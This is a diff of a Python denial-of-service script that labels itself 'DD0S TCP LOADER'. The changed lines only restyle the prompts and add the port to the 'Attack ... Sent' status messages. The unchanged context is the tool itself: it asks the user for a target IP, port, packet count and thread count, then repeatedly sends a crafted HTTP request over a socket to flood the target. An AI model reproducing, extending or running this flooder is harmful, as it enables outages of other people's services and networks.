@@ -72,13 +72,13 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
 ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
-print("\033[33m=====>>>")
+print("\033[33m———————⟩⟩⟩")
 port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
-print("\033[32m=====>>>")
+print("\033[32m———————⟩⟩⟩")
 packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
-print("\033[31m=====>>>")
+print("\033[31m-——————⟩⟩⟩")
 thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
-print("\033[94m=====>>>"),
+print("\033[94m———————⟩⟩⟩"),
 time.sleep(5),
 print("\033[96m                  >>> DD0S TCP LOADER \033[0m "),
 time.sleep(5),
@@ -109,13 +109,13 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[+\033[96m]\033[33mKOMA  \033[92mAttack {0}   \033[97mSent:.. {2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[+\033[96m]\033[33mKOMA  \033[92mAttack {0}:{1}  \033[97mSent:.. {2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[+\033[96m]\033[33mKOMA  \033[92mAttack {0}   \033[97mSent::... {2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[+\033[96m]\033[33mKOMA  \033[92mAttack {0}:{1}  \033[97mSent::... {2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[+\033[96m]\033[33mKOMA  \033[92mAttack {0}   \033[97mSent:::.... {2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[+\033[96m]\033[33mKOMA  \033[92mAttack {0}:{1}  \033[97mSent:::.... {2}\033[0m".format(str(ip), int(port), xx))
         
         except:
                s.close()
